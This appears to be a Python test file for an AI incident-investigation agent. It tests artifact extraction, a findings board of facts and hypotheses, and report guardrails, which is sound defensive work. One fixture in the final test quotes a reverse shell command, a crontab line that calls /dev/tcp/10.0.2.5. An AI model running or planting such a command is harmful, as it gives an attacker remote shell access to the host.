from __future__ import annotations

import asyncio
import json
import os
import sys
import tempfile
import unittest

backend_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, backend_root)
os.environ.setdefault("DJANGO_SETTINGS_MODULE", "aci_backend.settings")
os.environ.setdefault("SECRET_KEY", "test")
os.environ["BOARD_DB_PATH"] = tempfile.mktemp(suffix=".db")

import django

django.setup()

from aci_board import store as board_store
from agent.runtime.artifacts import extract_artifacts
from agent.runtime.graph import (
    _derive_report_guardrails,
    _ensure_investigation_task_template,
    _format_board_context,
    pivot,
    use_tools,
)
from langchain_core.messages import AIMessage


class EventSearchTool:
    name = "search"

    async def ainvoke(self, args):
        return json.dumps({
            "hits": {
                "hits": [{
                    "_id": "event-1",
                    "_source": {
                        "data": {
                            "srcip": "8.8.8.8",
                            "dstuser": "alice",
                            "sha256": "a" * 64,
                        },
                        "host": {"name": "web-01"},
                        "process": {"name": "curl"},
                    },
                }]
            }
        })


class TestFindingsBoard(unittest.TestCase):
    def setUp(self):
        board_store.init_db()
        import sqlite3

        connection = sqlite3.connect(os.environ["BOARD_DB_PATH"])
        connection.execute("DELETE FROM board_entries")
        connection.commit()
        connection.close()

    def test_nested_event_artifacts_are_extracted(self):
        artifacts = extract_artifacts(asyncio.run(EventSearchTool().ainvoke({})))
        pairs = {(item.kind, item.value, item.source) for item in artifacts}
        self.assertIn(("ip", "8.8.8.8", "event-1"), pairs)
        self.assertIn(("event_id", "event-1", "event-1"), pairs)
        self.assertIn(("user", "alice", "event-1"), pairs)
        self.assertIn(("host", "web-01", "event-1"), pairs)
        self.assertIn(("process", "curl", "event-1"), pairs)
        self.assertIn(("sha256", "a" * 64, "event-1"), pairs)

    def test_tool_result_populates_artifacts_without_board_tool(self):
        state = {
            "run_id": "run-artifacts",
            "case_id": "case-artifacts",
            "agent_name": "investigation",
            "messages": [AIMessage(
                content="",
                tool_calls=[{"id": "call-1", "name": "search", "args": {"query": "*"}}],
            )],
            "tool_calls_made": 0,
            "current_intent": "I will retrieve the event.",
            "intent_sequence": 1,
        }
        asyncio.run(use_tools(state, {"configurable": {"tools": [EventSearchTool()]}}))

        entries = board_store.list_entries(
            "case-artifacts", "run-artifacts", "investigation"
        )
        self.assertTrue(entries)
        self.assertEqual({entry["kind"] for entry in entries}, {"artifact"})
        self.assertIn("ip: 8.8.8.8", {entry["content"] for entry in entries})

    def test_hypotheses_are_persisted_without_model_tool_call(self):
        state = {
            "case_id": "case-hypothesis",
            "run_id": "run-hypothesis",
            "agent_name": "investigation",
            "final_answer": (
                "## Confirmed Facts\n- None confirmed.\n\n"
                "## Hypotheses\n"
                "- The scheduled task may provide persistence for the downloaded script.\n"
                "- The privileged command may have been executed by a compromised account."
            ),
        }
        asyncio.run(pivot(state, {"configurable": {"tools": []}}))

        entries = board_store.list_entries(
            "case-hypothesis", "run-hypothesis", "investigation"
        )
        hypotheses = [entry for entry in entries if entry["kind"] == "hypothesis"]
        self.assertEqual(len(hypotheses), 2)
        self.assertTrue(all(entry["status"] == "open" for entry in hypotheses))

    def test_context_contains_artifacts_facts_and_hypotheses(self):
        raw = json.dumps({"entries": [
            {"kind": "artifact", "content": "ip: 8.8.8.8", "source": "event-1"},
            {"kind": "fact", "content": "The task ran as root.", "source": "event-2"},
            {
                "kind": "hypothesis",
                "content": "The task established persistence.",
                "source": "",
                "status": "open",
                "confidence": "medium",
            },
        ]})
        context = _format_board_context(raw)
        self.assertIn("Found artifacts", context)
        self.assertIn("Confirmed facts", context)
        self.assertIn("Hypotheses", context)
        self.assertIn("pivot on relevant artifacts", context)

    def test_freeform_investigation_output_is_wrapped_for_board_parsing(self):
        state = {
            "case_id": "case-template",
            "run_id": "run-template",
            "agent_name": "investigation",
            "current_task": {"title": "Investigate crontab changes"},
            "ctx_tokens": 0,
        }
        text, _ = asyncio.run(_ensure_investigation_task_template(
            state,
            {"configurable": {"model": None}},
            [],
            "Task Completion Update\nNo crontab events were found in the narrowed window.",
        ))

        self.assertTrue(text.startswith("## Confirmed Facts"))
        self.assertIn("## Findings", text)
        self.assertIn("## Hypotheses", text)
        self.assertIn("Task Completion Update", text)

    def test_section_parser_stops_at_h3_and_hypotheses_headers(self):
        state = {
            "case_id": "case-sections",
            "run_id": "run-sections",
            "agent_name": "investigation",
            "final_answer": (
                "## Confirmed Facts\n"
                "- Event evt-1 at 2025-04-20T03:54:00Z modified crontab.\n\n"
                "### Findings\n"
                "This narrative should not be parsed as a fact.\n\n"
                "## Hypotheses\n"
                "- The attacker established cron persistence."
            ),
        }
        asyncio.run(pivot(state, {"configurable": {"tools": []}}))

        entries = board_store.list_entries(
            "case-sections", "run-sections", "investigation"
        )
        facts = [entry["content"] for entry in entries if entry["kind"] == "fact"]
        hypotheses = [entry["content"] for entry in entries if entry["kind"] == "hypothesis"]
        self.assertEqual(facts, ["Event evt-1 at 2025-04-20T03:54:00Z modified crontab."])
        self.assertEqual(hypotheses, ["The attacker established cron persistence."])

    def test_report_guardrails_correlate_reverse_shell_to_bruteforce_source(self):
        facts = [
            {
                "kind": "fact",
                "content": "2025-04-19: SSH brute force from 10.0.2.5 against kali.",
            },
            {
                "kind": "fact",
                "content": (
                    "2025-04-20: crontab added reverse shell "
                    "`sh -i >& /dev/tcp/10.0.2.5/5555 0>&1`."
                ),
            },
            {
                "kind": "fact",
                "content": "Rootcheck flagged trojaned /bin/diff and /usr/bin/diff.",
            },
        ]
        derived, guardrails = _derive_report_guardrails([], facts, [], [])

        self.assertTrue(any("10.0.2.5" in finding for finding in derived))
        self.assertIn("Severity floor: critical", guardrails)
        self.assertIn("decisive linkage", guardrails)


if __name__ == "__main__":
    unittest.main(verbosity=2)
